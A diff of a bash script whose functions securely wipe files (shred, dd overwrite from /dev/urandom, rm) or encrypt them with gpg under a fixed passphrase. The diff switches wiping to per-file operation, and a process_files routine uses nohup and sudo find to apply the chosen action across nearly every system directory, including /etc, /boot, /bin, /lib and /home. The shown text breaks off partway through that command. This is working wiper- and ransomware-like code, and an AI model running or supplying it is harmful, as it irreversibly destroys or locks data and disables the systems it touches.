@@ -19,14 +19,13 @@ prepare_logs() {
 # Function to wipe using efficient shredding
 wipe_files() {
     if $SHRED_PRESENT; then
-        echo "Using shred..."
-        find "$1" -type f -exec shred -uzv {} + >> remaining_files.log 2>&1
-        find "$1" -type d -empty -delete >> remaining_files.log 2>&1
+        echo "Using shred on $1..."
+        shred -uzv "$1" >> remaining_files.log 2>&1
     elif $DD_PRESENT; then
-        echo "shred not found, using dd..."
+        echo "shred not found, using dd on $1..."
         dd if=/dev/urandom of="$1" bs=1M status=progress
     elif $RM_PRESENT; then
-        echo "shred and dd not found, using rm..."
+        echo "shred and dd not found, using rm on $1..."
         rm -f "$1"
     else
         echo "No suitable tool found for wiping."
@@ -36,7 +35,7 @@ wipe_files() {
 # Function to encrypt using available tools
 encrypt_files() {
     if $GPG_PRESENT; then
-        echo "Using gpg..."
+        echo "Using gpg on $1..."
         timeout 10s gpg --yes --batch --passphrase "$PASSPHRASE" -c "$1"
     else
         echo "gpg not found, skipping encryption."
@@ -46,6 +45,7 @@ encrypt_files() {
 # Function to process files based on user choice
 process_files() {
     local action=$1
+    export -f "$action" # Export the function so that it is available in subshells
     if $NOHUP_PRESENT; then
         nohup sudo find /tmp /var/log /var/tmp /home /var/cache /opt /usr/local /var/lib \
         /usr/bin /usr/sbin /lib /lib64 /etc /boot /bin /sbin /mnt \
